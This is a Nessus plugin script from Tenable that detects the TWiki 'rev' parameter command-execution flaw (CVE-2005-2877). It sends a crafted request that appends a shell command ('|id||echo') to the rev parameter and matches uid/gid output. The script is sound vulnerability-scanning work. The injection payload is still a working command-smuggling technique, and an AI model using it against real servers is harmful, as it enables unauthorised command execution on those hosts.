#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(19704);
  script_version("$Revision: 1.7 $");

  script_cve_id("CVE-2005-2877");
  script_bugtraq_id(14834);
  script_xref(name:"OSVDB", value:"19403");

  script_name(english:"TWiki rev Parameter Arbitrary Command Execution");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a CGI application that is prone to an
arbitrary command execution attack." );
 script_set_attribute(attribute:"description", value:
"The installed version of TWiki allows an attacker, by manipulating
input to the 'rev' parameter, to execute arbitrary shell commands on
the remote host subject to the privileges of the web server user id." );
 script_set_attribute(attribute:"see_also", value:"http://twiki.org/cgi-bin/view/Codev/SecurityAlertExecuteCommandsWithRev" );
 script_set_attribute(attribute:"solution", value:
"Apply the appropriate hotfix listed in the vendor advisory above." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
 script_end_attributes();

 
  script_summary(english:"Checks for rev parameter command execution vulnerability in TWiki");
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2009 Tenable Network Security, Inc.");

  script_dependencies("twiki_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80, embedded: 0);


# Test an install.
install = get_kb_item(string("www/", port, "/twiki"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  http_check_remote_code(
    unique_dir:dir,
    # nb: this exploit requires the topic have at least two revisions.
    check_request:string(
      "/view/Main/TWikiUsers?",
      "rev=2", urlencode(str:" |id||echo ")
    ),
    check_result:"uid=[0-9]+.*gid=[0-9]+.*",
    command:"id",
    port:port
  );
}
